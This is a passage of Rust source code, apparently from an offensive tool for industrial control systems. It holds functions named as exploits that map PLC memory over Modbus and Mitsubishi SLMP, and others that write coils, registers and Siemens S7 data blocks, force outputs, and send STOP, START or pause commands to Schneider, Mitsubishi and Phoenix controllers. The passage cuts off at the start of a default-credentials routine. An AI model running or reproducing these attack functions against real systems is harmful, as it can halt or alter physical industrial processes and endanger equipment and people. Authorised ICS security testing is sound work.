        start += count;
        remaining -= count;
    }
    chunks
}

fn exploit_modbus_map(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;

    let ranges = match parse_modbus_map_input(input) {
        Ok(ranges) => ranges,
        Err(e) => {
            out(&format!("[-] {e}"));
            return;
        }
    };
    let mode = input.trim();
    let mode = if mode.is_empty() { "quick" } else { mode };
    out(&format!(
        "[*] Modbus map on {ip}:{} ({mode}, read-only)...",
        crate::core::modbus::effective_port(port)
    ));
    out("[*] Modbus exposes address tables, not semantic tag names; this maps readable ranges.");
    let mut points_addr = Vec::<String>::new();
    let mut points_type = Vec::<String>::new();
    let mut points_value = Vec::<String>::new();
    let mut readable_chunks = 0usize;
    let mut readable_values = 0usize;
    let mut failed_chunks = 0usize;
    let mut hidden_errors = 0usize;
    let mut skipped_chunks = 0usize;
    let mut interesting_total = 0usize;
    let mut interesting_printed = 0usize;
    let mut interesting_header_printed = false;

    for range in ranges {
        let chunks = modbus_map_chunks(range);
        out(&format!(
            "[*] {} {} {}..{} ({} value(s), {} chunk(s))",
            range.table.short_name(),
            range.table.label(),
            range.display_start(),
            range.display_end(),
            range.count,
            chunks.len()
        ));
        let mut consecutive_address_errors = 0usize;
        for (idx, (start, count)) in chunks.iter().copied().enumerate() {
            let result = match range.table {
                ModbusTable::Holding => modbus::read_holding_registers(ip, port, start, count),
                ModbusTable::Input => modbus::read_input_registers(ip, port, start, count),
                ModbusTable::Coil => modbus::read_coils(ip, port, start, count),
                ModbusTable::Discrete => modbus::read_discrete_inputs(ip, port, start, count),
            };
            match result {
                Ok(regs) => {
                    readable_chunks += 1;
                    readable_values += regs.len();
                    interesting_total += emit_modbus_interesting_limited(
                        &regs,
                        out,
                        &mut interesting_printed,
                        &mut interesting_header_printed,
                    );
                    collect_modbus_points(
                        range.table,
                        range.table.point_type(),
                        &regs,
                        &mut points_addr,
                        &mut points_type,
                        &mut points_value,
                    );
                    consecutive_address_errors = 0;
                }
                Err(e) => {
                    failed_chunks += 1;
                    if failed_chunks <= MODBUS_MAP_ERROR_OUTPUT_CAP {
                        let display_start = range.table.display_addr(u32::from(start));
                        let display_end = range
                            .table
                            .display_addr(u32::from(start) + u32::from(count) - 1);
                        out(&format!(
                            "[-] {} {}..{}: {e}",
                            range.table.short_name(),
                            display_start,
                            display_end
                        ));
                    } else {
                        hidden_errors += 1;
                    }
                    let error = e.to_string().to_ascii_lowercase();
                    let remaining_chunks = chunks.len().saturating_sub(idx + 1);
                    if error.contains("illegal function") {
                        skipped_chunks += remaining_chunks;
                        if remaining_chunks > 0 {
                            out(&format!(
                                "[!] {} table does not support this function; skipped {remaining_chunks} remaining chunk(s)",
                                range.table.short_name()
                            ));
                        }
                        break;
                    }
                    if error.contains("illegal data address") || error.contains("illegal address") {
                        consecutive_address_errors += 1;
                        if consecutive_address_errors >= 3 && remaining_chunks > 0 {
                            skipped_chunks += remaining_chunks;
                            out(&format!(
                                "[!] {} table returned repeated illegal address errors; skipped {remaining_chunks} remaining chunk(s)",
                                range.table.short_name()
                            ));
                            break;
                        }
                    } else {
                        consecutive_address_errors = 0;
                    }
                }
            }
        }
    }

    if hidden_errors > 0 {
        out(&format!(
            "[!] {hidden_errors} more unreadable chunk(s) omitted from output"
        ));
    }
    if skipped_chunks > 0 {
        out(&format!(
            "[!] {skipped_chunks} chunk(s) skipped after table-level Modbus exceptions"
        ));
    }
    if interesting_total > MODBUS_MAP_VALUE_OUTPUT_CAP {
        out(&format!(
            "[*] {} more non-default value(s) omitted from output",
            interesting_total - MODBUS_MAP_VALUE_OUTPUT_CAP
        ));
    }

    let points: Vec<(&str, Option<&str>, &str)> = points_addr
        .iter()
        .zip(points_type.iter())
        .zip(points_value.iter())
        .map(|((addr, typ), value)| (addr.as_str(), Some(typ.as_str()), value.as_str()))
        .collect();
    if !points.is_empty() {
        save_and_diff(ip, "modbus", &points, out);
    }

    if readable_values == 0 {
        out("[!] No requested Modbus ranges were readable");
    } else if interesting_total == 0 {
        out(&format!(
            "[+] {readable_values} value(s) read across {readable_chunks} chunk(s); all values were zero/OFF"
        ));
    } else {
        out(&format!(
            "[+] {readable_values} value(s) read across {readable_chunks} chunk(s); {interesting_total} non-default value(s) surfaced"
        ));
    }
    if failed_chunks > 0 {
        out(&format!("[!] {failed_chunks} chunk(s) were unreadable"));
    }
}

fn emit_modbus_interesting_limited(
    regs: &[crate::core::modbus::ModbusRegister],
    out: &impl Fn(&str),
    printed: &mut usize,
    header_printed: &mut bool,
) -> usize {
    let mut total = 0usize;
    for r in regs.iter().filter(|r| r.raw != 0) {
        total += 1;
        if *printed < MODBUS_MAP_VALUE_OUTPUT_CAP {
            if !*header_printed {
                let [hdr, sep] = modbus_header();
                out(&hdr);
                out(&sep);
                *header_printed = true;
            }
            out(&fmt_modbus_row(r));
            *printed += 1;
        }
    }
    total
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SlmpDeviceKind {
    Word,
    Bit,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct SlmpMapRange {
    device: &'static str,
    kind: SlmpDeviceKind,
    start: u32,
    count: u32,
}

impl SlmpMapRange {
    fn new(device: &'static str, kind: SlmpDeviceKind, start: u32, count: u32) -> Self {
        Self {
            device,
            kind,
            start,
            count,
        }
    }

    fn display_start(self) -> String {
        format!("{}{}", self.device, self.start)
    }

    fn display_end(self) -> String {
        format!("{}{}", self.device, self.start + self.count - 1)
    }

    fn point_type(self) -> &'static str {
        match self.kind {
            SlmpDeviceKind::Word => "UINT16",
            SlmpDeviceKind::Bit => "BOOL",
        }
    }

    fn chunk_limit(self) -> u16 {
        match self.kind {
            SlmpDeviceKind::Word => SLMP_WORD_CHUNK,
            SlmpDeviceKind::Bit => SLMP_BIT_CHUNK,
        }
    }
}

fn parse_slmp_device(input: &str) -> Option<(&'static str, SlmpDeviceKind)> {
    match input.trim().to_ascii_lowercase().as_str() {
        "d" | "data" | "data-register" | "data-registers" => Some(("D", SlmpDeviceKind::Word)),
        "w" | "link-register" | "link-registers" => Some(("W", SlmpDeviceKind::Word)),
        "r" | "file-register" | "file-registers" => Some(("R", SlmpDeviceKind::Word)),
        "m" | "marker" | "markers" | "internal-relay" | "internal-relays" => {
            Some(("M", SlmpDeviceKind::Bit))
        }
        "x" | "input" | "inputs" => Some(("X", SlmpDeviceKind::Bit)),
        "y" | "output" | "outputs" => Some(("Y", SlmpDeviceKind::Bit)),
        "b" | "link-relay" | "link-relays" => Some(("B", SlmpDeviceKind::Bit)),
        _ => None,
    }
}

fn quick_slmp_ranges() -> Vec<SlmpMapRange> {
    vec![
        SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 50),
        SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, 128),
    ]
}

fn common_slmp_ranges() -> Vec<SlmpMapRange> {
    vec![
        SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 1000),
        SlmpMapRange::new("W", SlmpDeviceKind::Word, 0, 512),
        SlmpMapRange::new("R", SlmpDeviceKind::Word, 0, 512),
        SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, 2048),
        SlmpMapRange::new("X", SlmpDeviceKind::Bit, 0, 512),
        SlmpMapRange::new("Y", SlmpDeviceKind::Bit, 0, 512),
        SlmpMapRange::new("B", SlmpDeviceKind::Bit, 0, 512),
    ]
}

fn all_slmp_ranges() -> Vec<SlmpMapRange> {
    vec![
        SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("W", SlmpDeviceKind::Word, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("R", SlmpDeviceKind::Word, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("X", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("Y", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("B", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
    ]
}

fn parse_slmp_map_input(input: &str) -> std::result::Result<Vec<SlmpMapRange>, String> {
    let spec = input.trim();
    if spec.is_empty() || spec.eq_ignore_ascii_case("quick") {
        return Ok(quick_slmp_ranges());
    }
    if spec.eq_ignore_ascii_case("common") {
        return Ok(common_slmp_ranges());
    }
    if spec.eq_ignore_ascii_case("all") {
        return Ok(all_slmp_ranges());
    }

    let mut ranges = Vec::new();
    for token in spec.split(',') {
        let token = token.trim();
        if token.is_empty() {
            return Err(format_slmp_map_usage());
        }
        let parts: Vec<_> = token.split(':').map(str::trim).collect();
        if parts.len() != 3 {
            return Err(format_slmp_map_usage());
        }
        let (device, kind) = parse_slmp_device(parts[0]).ok_or_else(|| {
            format!(
                "unknown SLMP device '{}'. {}",
                parts[0],
                format_slmp_map_usage()
            )
        })?;
        let start = parts[1].parse::<u32>().map_err(|_| {
            format!(
                "invalid start address '{}'. {}",
                parts[1],
                format_slmp_map_usage()
            )
        })?;
        let count = parts[2]
            .parse::<u32>()
            .map_err(|_| format!("invalid count '{}'. {}", parts[2], format_slmp_map_usage()))?;
        if start >= SLMP_ADDRESS_SPACE {
            return Err(format!(
                "start address {start} is outside 0..16777215. {}",
                format_slmp_map_usage()
            ));
        }
        if count == 0 || count > SLMP_ADDRESS_SPACE - start {
            return Err(format!(
                "count {count} at start {start} is outside the SLMP address space. {}",
                format_slmp_map_usage()
            ));
        }
        ranges.push(SlmpMapRange::new(device, kind, start, count));
    }

    if ranges.is_empty() {
        Err(format_slmp_map_usage())
    } else {
        Ok(ranges)
    }
}

fn format_slmp_map_usage() -> String {
    "use quick, common, all, or device:start:count entries like d:0:100,m:0:128,w:0:64".to_string()
}

fn slmp_map_chunks(range: SlmpMapRange) -> Vec<(u32, u16)> {
    let mut chunks = Vec::new();
    let mut start = range.start;
    let mut remaining = range.count;
    let max_count = u32::from(range.chunk_limit());
    while remaining > 0 {
        let count = remaining.min(max_count);
        chunks.push((start, u16::try_from(count).unwrap_or(u16::MAX)));
        start += count;
        remaining -= count;
    }
    chunks
}

fn exploit_slmp_map(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::slmp;

    let ranges = match parse_slmp_map_input(input) {
        Ok(ranges) => ranges,
        Err(e) => {
            out(&format!("[-] {e}"));
            return;
        }
    };
    let mode = input.trim();
    let mode = if mode.is_empty() { "quick" } else { mode };
    let effective_port = if port == 0 { slmp::DEFAULT_PORT } else { port };
    out(&format!(
        "[*] SLMP map on {ip}:{effective_port} ({mode}, read-only)..."
    ));
    out("[*] SLMP exposes device memory areas, not semantic tag names; this maps readable ranges.");

    let mut points_addr = Vec::<String>::new();
    let mut points_type = Vec::<String>::new();
    let mut points_value = Vec::<String>::new();
    let mut readable_chunks = 0usize;
    let mut readable_values = 0usize;
    let mut failed_chunks = 0usize;
    let mut hidden_errors = 0usize;
    let mut interesting_total = 0usize;
    let mut interesting_printed = 0usize;
    let mut interesting_header_printed = false;

    for range in ranges {
        let chunks = slmp_map_chunks(range);
        out(&format!(
            "[*] {} {}..{} ({} value(s), {} chunk(s))",
            range.device,
            range.display_start(),
            range.display_end(),
            range.count,
            chunks.len()
        ));
        for (start, count) in chunks {
            let result = match range.kind {
                SlmpDeviceKind::Word => {
                    slmp::read_word_devices(ip, port, range.device, start, count)
                }
                SlmpDeviceKind::Bit => slmp::read_bit_devices(ip, port, range.device, start, count),
            };
            match result {
                Ok(vals) => {
                    readable_chunks += 1;
                    readable_values += vals.len();
                    interesting_total += emit_slmp_interesting_limited(
                        &vals,
                        out,
                        &mut interesting_printed,
                        &mut interesting_header_printed,
                    );
                    for val in vals {
                        points_addr.push(val.display);
                        points_type.push(range.point_type().to_string());
                        points_value.push(val.value_str);
                    }
                }
                Err(e) => {
                    failed_chunks += 1;
                    if failed_chunks <= MODBUS_MAP_ERROR_OUTPUT_CAP {
                        let end = start + u32::from(count) - 1;
                        out(&format!(
                            "[-] {}{}..{}{}: {e}",
                            range.device, start, range.device, end
                        ));
                    } else {
                        hidden_errors += 1;
                    }
                }
            }
        }
    }

    if hidden_errors > 0 {
        out(&format!(
            "[!] {hidden_errors} more unreadable chunk(s) omitted from output"
        ));
    }
    if interesting_total > MODBUS_MAP_VALUE_OUTPUT_CAP {
        out(&format!(
            "[*] {} more non-default value(s) omitted from output",
            interesting_total - MODBUS_MAP_VALUE_OUTPUT_CAP
        ));
    }

    let points: Vec<(&str, Option<&str>, &str)> = points_addr
        .iter()
        .zip(points_type.iter())
        .zip(points_value.iter())
        .map(|((addr, typ), value)| (addr.as_str(), Some(typ.as_str()), value.as_str()))
        .collect();
    if !points.is_empty() {
        save_and_diff(ip, "slmp", &points, out);
    }

    if readable_values == 0 {
        out("[!] No requested SLMP ranges were readable");
    } else if interesting_total == 0 {
        out(&format!(
            "[+] {readable_values} value(s) read across {readable_chunks} chunk(s); all values were zero/OFF"
        ));
    } else {
        out(&format!(
            "[+] {readable_values} value(s) read across {readable_chunks} chunk(s); {interesting_total} non-default value(s) surfaced"
        ));
    }
    if failed_chunks > 0 {
        out(&format!("[!] {failed_chunks} chunk(s) were unreadable"));
    }
}

fn emit_slmp_interesting_limited(
    vals: &[crate::vendors::mitsubishi::slmp::SlmpValue],
    out: &impl Fn(&str),
    printed: &mut usize,
    header_printed: &mut bool,
) -> usize {
    let mut total = 0usize;
    for v in vals.iter().filter(|v| v.raw != 0) {
        total += 1;
        if *printed < MODBUS_MAP_VALUE_OUTPUT_CAP {
            if !*header_printed {
                out("[*] Non-default SLMP values:");
                let [hdr, sep] = slmp_header();
                out(&hdr);
                out(&sep);
                *header_printed = true;
            }
            out(&fmt_slmp_row(v));
            *printed += 1;
        }
    }
    total
}

fn collect_modbus_points(
    table: ModbusTable,
    typ: &str,
    regs: &[crate::core::modbus::ModbusRegister],
    addrs: &mut Vec<String>,
    types: &mut Vec<String>,
    values: &mut Vec<String>,
) {
    for r in regs {
        addrs.push(table.point_key(u32::from(r.address)));
        types.push(typ.to_string());
        let value = match table {
            ModbusTable::Holding | ModbusTable::Input => r.raw.to_string(),
            ModbusTable::Coil | ModbusTable::Discrete => r.value_str.clone(),
        };
        values.push(value);
    }
}

fn exploit_modbus_holding(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
    out(&format!(
        "[*] Reading {count} holding registers from {ip} (start={start})..."
    ));
    match modbus::read_holding_registers(ip, port, start, count) {
        Ok(regs) => {
            let [hdr, sep] = modbus_header();
            out(&hdr);
            out(&sep);
            for r in &regs {
                out(&fmt_modbus_row(r));
            }
            out(&sep);
            out(&format!("[+] {} register(s)", regs.len()));
            let addrs: Vec<String> = regs
                .iter()
                .map(|r| ModbusTable::Holding.point_key(u32::from(r.address)))
                .collect();
            let vals: Vec<String> = regs.iter().map(|r| r.raw.to_string()).collect();
            let points: Vec<(&str, Option<&str>, &str)> = addrs
                .iter()
                .zip(vals.iter())
                .map(|(a, v)| (a.as_str(), Some("UINT16"), v.as_str()))
                .collect();
            save_and_diff(ip, "modbus", &points, out);
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_modbus_coils(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(64).min(2000);
    out(&format!(
        "[*] Reading {count} coils from {ip} (start={start})..."
    ));
    match modbus::read_coils(ip, port, start, count) {
        Ok(regs) => {
            let [hdr, sep] = modbus_header();
            out(&hdr);
            out(&sep);
            for r in &regs {
                out(&fmt_modbus_row(r));
            }
            out(&sep);
            out(&format!("[+] {} coil(s)", regs.len()));
            let addrs: Vec<String> = regs
                .iter()
                .map(|r| ModbusTable::Coil.point_key(u32::from(r.address)))
                .collect();
            let vals: Vec<String> = regs.iter().map(|r| r.value_str.clone()).collect();
            let points: Vec<(&str, Option<&str>, &str)> = addrs
                .iter()
                .zip(vals.iter())
                .map(|(a, v)| (a.as_str(), Some("BOOL"), v.as_str()))
                .collect();
            save_and_diff(ip, "modbus", &points, out);
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_modbus_input(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
    out(&format!(
        "[*] Reading {count} input registers from {ip} (start={start})..."
    ));
    match modbus::read_input_registers(ip, port, start, count) {
        Ok(regs) => {
            let [hdr, sep] = modbus_header();
            out(&hdr);
            out(&sep);
            for r in &regs {
                out(&fmt_modbus_row(r));
            }
            out(&sep);
            out(&format!("[+] {} register(s)", regs.len()));
            let addrs: Vec<String> = regs
                .iter()
                .map(|r| ModbusTable::Input.point_key(u32::from(r.address)))
                .collect();
            let vals: Vec<String> = regs.iter().map(|r| r.raw.to_string()).collect();
            let points: Vec<(&str, Option<&str>, &str)> = addrs
                .iter()
                .zip(vals.iter())
                .map(|(a, v)| (a.as_str(), Some("UINT16"), v.as_str()))
                .collect();
            save_and_diff(ip, "modbus", &points, out);
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── New Phoenix exploits ────────────────────────────────────────────────────

fn exploit_modbus_discrete(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(64).min(2000);
    out(&format!(
        "[*] Reading {count} discrete inputs from {ip} (start={start})..."
    ));
    match modbus::read_discrete_inputs(ip, port, start, count) {
        Ok(regs) => {
            let [hdr, sep] = modbus_header();
            out(&hdr);
            out(&sep);
            for r in &regs {
                out(&fmt_modbus_row(r));
            }
            out(&sep);
            out(&format!("[+] {} discrete input(s)", regs.len()));
            let addrs: Vec<String> = regs
                .iter()
                .map(|r| ModbusTable::Discrete.point_key(u32::from(r.address)))
                .collect();
            let vals: Vec<String> = regs.iter().map(|r| r.value_str.clone()).collect();
            let points: Vec<(&str, Option<&str>, &str)> = addrs
                .iter()
                .zip(vals.iter())
                .map(|(a, v)| (a.as_str(), Some("BOOL"), v.as_str()))
                .collect();
            save_and_diff(ip, "modbus", &points, out);
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_phoenix_control_ilc150(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::control;
    let (action, start_type) = input.split_once(':').unwrap_or((input, "cold"));
    out(&format!("[*] Sending ILC150 '{action}' command to {ip}..."));
    match control::control_ilc150(ip, port, action, start_type) {
        Ok(state) => out(&format!("[+] PLC state: {state}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_phoenix_control_ilc390(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::control;
    out(&format!("[*] Sending ILC390 '{input}' command to {ip}..."));
    match control::control_ilc390(ip, port, input) {
        Ok(state) => out(&format!("[+] PLC state: {state}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── New Mitsubishi exploits ─────────────────────────────────────────────────

fn exploit_mitsubishi_set_pause(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::control;
    let iface = NetworkInterface {
        name: "auto".into(),
        ip: local_ip_for(ip),
        netmask: "255.255.255.0".into(),
    };
    out(&format!("[*] Setting Mitsubishi to pause on {ip}..."));
    match control::set_state_ip(&iface, ip, "pause") {
        Ok(true) => out("[+] State set to pause"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_mitsubishi_read_d(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::slmp;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "50"));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(50).min(960);
    let end = start.saturating_add(u32::from(count)).saturating_sub(1);
    out(&format!("[*] Reading D{start}..D{end} from {ip}..."));
    match slmp::read_word_devices(ip, port, "D", start, count) {
        Ok(vals) => {
            let [hdr, sep] = slmp_header();
            out(&hdr);
            out(&sep);
            for v in &vals {
                out(&fmt_slmp_row(v));
            }
            out(&sep);
            out(&format!("[+] {} word(s)", vals.len()));
            let addrs: Vec<String> = vals.iter().map(|v| v.display.clone()).collect();
            let strs: Vec<String> = vals.iter().map(|v| v.raw.to_string()).collect();
            let points: Vec<(&str, Option<&str>, &str)> = addrs
                .iter()
                .zip(strs.iter())
                .map(|(a, v)| (a.as_str(), Some("UINT16"), v.as_str()))
                .collect();
            save_and_diff(ip, "slmp", &points, out);
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_mitsubishi_read_m(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::slmp;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(64).min(3584);
    let end = start.saturating_add(u32::from(count)).saturating_sub(1);
    out(&format!("[*] Reading M{start}..M{end} from {ip}..."));
    match slmp::read_bit_devices(ip, port, "M", start, count) {
        Ok(vals) => {
            let [hdr, sep] = slmp_header();
            out(&hdr);
            out(&sep);
            for v in &vals {
                out(&fmt_slmp_row(v));
            }
            out(&sep);
            out(&format!("[+] {} bit(s)", vals.len()));
            let addrs: Vec<String> = vals.iter().map(|v| v.display.clone()).collect();
            let strs: Vec<String> = vals.iter().map(|v| v.value_str.clone()).collect();
            let points: Vec<(&str, Option<&str>, &str)> = addrs
                .iter()
                .zip(strs.iter())
                .map(|(a, v)| (a.as_str(), Some("BOOL"), v.as_str()))
                .collect();
            save_and_diff(ip, "slmp", &points, out);
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Modbus write exploits ────────────────────────────────────────────────────

fn exploit_modbus_write_coil(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (addr_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
    let addr = addr_s.trim().parse::<u16>().unwrap_or(0);
    let on = !state_s.trim().eq_ignore_ascii_case("off");
    out(&format!(
        "[*] Writing coil {addr} = {} on {ip}...",
        if on { "ON" } else { "OFF" }
    ));
    match modbus::write_single_coil(ip, port, addr, on) {
        Ok(()) => out(&format!("[+] Coil {addr} written")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_modbus_write_register(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (addr_s, val_s) = input.split_once(':').unwrap_or((input, "0"));
    let addr = addr_s.trim().parse::<u16>().unwrap_or(0);
    let value = val_s.trim().parse::<u16>().unwrap_or(0);
    out(&format!("[*] Writing register {addr} = {value} on {ip}..."));
    match modbus::write_single_register(ip, port, addr, value) {
        Ok(()) => out(&format!("[+] Register {addr} written")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_modbus_write_registers(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modbus;
    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let values: Vec<u16> = vals_s
        .split(',')
        .filter_map(|s| s.trim().parse::<u16>().ok())
        .collect();
    if values.is_empty() {
        out("[-] No valid register values provided (format: start:v0,v1,...)");
        return;
    }
    out(&format!(
        "[*] Writing {} registers starting at {start} on {ip}...",
        values.len()
    ));
    match modbus::write_multiple_registers(ip, port, start, &values) {
        Ok(n) => out(&format!("[+] {n} register(s) written")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Schneider FC90 exploits ──────────────────────────────────────────────────

fn exploit_fc90_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modicon_fc90;
    out(&format!(
        "[*] FC90 STOP command to {ip} (M340/Quantum/Premium)..."
    ));
    match modicon_fc90::stop_plc(ip, port) {
        Ok(true) => out("[+] PLC stopped (ack received)"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_fc90_start(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modicon_fc90;
    out(&format!(
        "[*] FC90 START command to {ip} (M340/Quantum/Premium)..."
    ));
    match modicon_fc90::start_plc(ip, port) {
        Ok(true) => out("[+] PLC started (ack received)"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_fc90_stop_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modicon_fc90;
    out(&format!("[*] FC90 STOP TM221 to {ip}..."));
    match modicon_fc90::stop_tm221(ip, port) {
        Ok(true) => out("[+] TM221 stopped"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_fc90_start_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modicon_fc90;
    out(&format!("[*] FC90 START TM221 to {ip}..."));
    match modicon_fc90::start_tm221(ip, port) {
        Ok(true) => out("[+] TM221 started"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_fc90_force(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::modicon_fc90::{self, ForceState};
    let (byte_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
    let output_byte =
        u8::from_str_radix(byte_s.trim().trim_start_matches("0x"), 16).unwrap_or(0x11);
    let state = match state_s.trim().to_lowercase().as_str() {
        "off" => ForceState::Off,
        "unforce" => ForceState::Unforce,
        _ => ForceState::On,
    };
    out(&format!(
        "[*] FC90 Force output 0x{output_byte:02x} to {state_s} on {ip}..."
    ));
    match modicon_fc90::force_output_bit(ip, port, output_byte, state) {
        Ok(true) => out("[+] Force command sent"),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── SLMP write exploits ──────────────────────────────────────────────────────

fn exploit_slmp_write_d(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::slmp;
    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let values: Vec<u16> = vals_s
        .split(',')
        .filter_map(|s| s.trim().parse::<u16>().ok())
        .collect();
    if values.is_empty() {
        out("[-] No valid values provided (format: start:v0,v1,...)");
        return;
    }
    out(&format!(
        "[*] Writing {} D registers starting at D{start} on {ip}...",
        values.len()
    ));
    match slmp::write_word_devices(ip, port, "D", start, &values) {
        Ok(()) => out("[+] D registers written"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_slmp_write_m(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::slmp;
    let (start_s, bits_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u32>().unwrap_or(0);
    let values: Vec<bool> = bits_s
        .trim()
        .chars()
        .filter_map(|c| match c {
            '0' => Some(false),
            '1' => Some(true),
            _ => None,
        })
        .collect();
    if values.is_empty() {
        out("[-] No valid bits provided (format: start:0101...)");
        return;
    }
    out(&format!(
        "[*] Writing {} M bits starting at M{start} on {ip}...",
        values.len()
    ));
    match slmp::write_bit_devices(ip, port, "M", start, &values) {
        Ok(()) => out("[+] M bits written"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Siemens DB write exploit ─────────────────────────────────────────────────

fn exploit_siemens_write_db(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let parts: Vec<&str> = input.trim().splitn(3, ':').collect();
    let db_str = parts.first().copied().unwrap_or("DB1");
    let db_num = db_str
        .trim_start_matches(|c: char| c.is_alphabetic())
        .parse::<u16>()
        .unwrap_or(1);
    let offset = parts
        .get(1)
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);
    let hex_data = parts.get(2).copied().unwrap_or("");
    let data: Vec<u8> = hex_data
        .as_bytes()
        .chunks(2)
        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
        .collect();
    if data.is_empty() {
        out("[-] No data to write (format: DB1:offset:hexbytes)");
        return;
    }
    out(&format!(
        "[*] Writing {} byte(s) to DB{db_num}:{offset} on {ip}:{port}...",
        data.len()
    ));
    match s7comm::write_data_block(ip, db_num, offset, &data, port, 5, None) {
        Ok(true) => out("[+] DB write acknowledged"),
        Ok(false) => out("[!] Write sent — PLC did not acknowledge"),
        Err(e) => {
            if s7comm::probe_auth_required(ip, port, 5) {
                out("[-] Access denied — retry via CLI with --password");
            } else {
                out(&format!("[-] {e}"));
            }
        }
    }
}

fn exploit_siemens_try_defaults(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::creds;
    use crate::vendors::default_creds;
